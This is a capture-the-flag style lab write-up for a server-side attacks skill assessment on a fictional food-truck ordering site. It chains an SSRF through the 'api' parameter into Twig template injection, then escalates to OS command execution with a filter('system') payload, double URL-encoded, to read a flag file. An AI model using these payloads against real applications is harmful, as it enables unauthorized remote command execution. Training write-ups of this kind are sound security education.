# Server-side Attacks - Skill Assessment

## Scenario

The food truck company Flavor Fusion Express tasked you to perform a security assessment of its newly launched website, created to enhance customer outreach and streamline online ordering. While the site aims to improve user engagement and brand presence, the company is particularly concerned about potential server-side vulnerabilities that could compromise sensitive business data, order information, or administrative functionality. Your task is to evaluate the backend infrastructure, configuration, and server logic for weaknesses that an attacker could exploit. Try to utilize the various techniques you learned in this module to identify and exploit vulnerabilities found in the web application.

## Tools Used for This Assessment

- Burp Suite
- Web Server 

## Qestion
 Apply what you have learned in this module to **obtain the flag**. 

## Solution

1. Visit the web app while enabling Burp's Proxy, we can observe that the web is fetching a remote resource through POST request
[text](obsidian://open?vault%3DCyber%26file%3DAsset%2FPasted%20image%2020260228133630.png)

2. Upon investigating the request body we can see that this request could potentially vulnerable to SSRF, to test that we could manipulate and point the `api` parameter to the web server itself (localhost), Use the following URL
```http
http://127.0.0.1:80/index.php
```
and we can see it responded with a HTML file which confirms our assumption 
[text](obsidian://open?vault%3DCyber%26file%3DAsset%2FPasted%20image%2020260228134031.png)

3. I tried fuzzing the port and other endpoints but got no result, and i tried using `file://` to read the file but it got filtered. So I decided to analyze the original request which is the following:
```http
http://truckapi.htb/?id%3DFusionExpress01
```
I decided to test using SSTI payload, some failed but this payloas `{{7*'7'}}` works, replace the original argument with the payload which would look like this
```
api=http://truckapi.htb/?id%3D{{7*'7'}}
```
The fact that the web app calculated the payload which resulted in the value of `49` instead of rendering it as a string `{{7*'7'}}` means that we got an SSTI vulnerability, to be more specificlly it's Twig SSTI
[text](obsidian://open?vault%3DCyber%26file%3DAsset%2FPasted%20image%2020260228134642.png)

4. Escalate the vulnerability to get more impact which is by using the following payload to execute an arbitrary OS command
```http
{{ ['id'] | filter('system') }}
```
Inject the payload double URL Encode it by blocking it and pressing `Ctrl + u` twice, it should look like this
```http
api=http://truckapi.htb/?id%3D{{%2b['id']%2b|%2bfilter('system')%2b}}
```
And we got our user ID
![alt text](<Pasted image 20260228135725.png>)

to get the flag change the id to `cat /flag.txt`, the payload should look like this
```http
api=http://truckapi.htb/?id%3D{{%2b['cat%2b/flag.txt']%2b|%2bfilter('system')%2b}}
```
